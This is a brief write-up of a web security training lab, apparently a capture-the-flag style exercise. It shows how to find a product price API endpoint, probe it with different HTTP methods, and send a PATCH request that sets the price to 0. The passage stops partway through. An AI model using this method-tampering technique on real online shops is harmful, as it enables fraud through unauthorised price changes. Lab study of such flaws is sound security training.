* Exploit
+ Access the lab
+ Login with test account
+ Go to =/api= endpoint but it gives =not found= error
+ Click every link to get every single endpoint
+ Add target product or any other product to cart.
+ Now we can see a endpoint =GET /api/products/1/price=  It return this json
#+begin_src json
{"price":"$1337.00","message":"11 people have viewed this item in the last 1h"}
#+end_src
+ Send this request to Repeater
+ Change request method to =POST=, =PUT=, =PATCH=, =OPTIONS=, =DELETE= and see how it response
+ Most of them gives =405 Method not allowed= error except =GET=, =PATCH= method
+ Now send the request with =PATCH= method
#+begin_src html
PATCH /api/products/1/price 
#+end_src
This give this response
#+begin_src json
 {"type":"ClientError","code":400,"error":"Only 'application/json' Content-Type is supported"}

#+begin_src html
  PATCH /api/products/1/price 
  Content-Type: application/json

  {"price": 0}
